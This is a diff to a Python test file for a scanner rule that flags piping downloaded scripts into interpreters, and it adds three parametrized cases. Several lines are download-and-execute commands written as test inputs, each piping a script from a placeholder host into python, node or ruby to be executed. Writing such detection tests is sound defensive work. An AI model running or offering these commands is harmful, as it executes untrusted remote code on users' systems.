@@ -189,6 +189,9 @@ def test_report_summary_writes_sarif_with_locations(tmp_path, capsys):
     ("curl https://x/install.py | python -c 'import sys;\nexec(sys.stdin.read())'", True),
     ("curl https://x/install.js | node -e 'const fs = require(\"fs\");\neval(fs.readFileSync(0, \"utf8\"))'", True),
     ("curl https://x/install.rb | ruby -e 'x = 1\nsystem(STDIN.read)'", True),
+    ('curl https://x/install.py | python -c "print(\\"ok\\");exec(input())"', True),
+    ("curl https://x/install.py | python -c 'print(1)'\"; exec(input())\"", True),
+    ('curl https://x/data.json | python -c "print(\\"ok\\")"', False),
 ])
 def test_pipe_to_shell_skips_an_interpreter_that_runs_its_own_program(line, fires):
     from dokimi.external.command_checks import PIPE_TO_SHELL
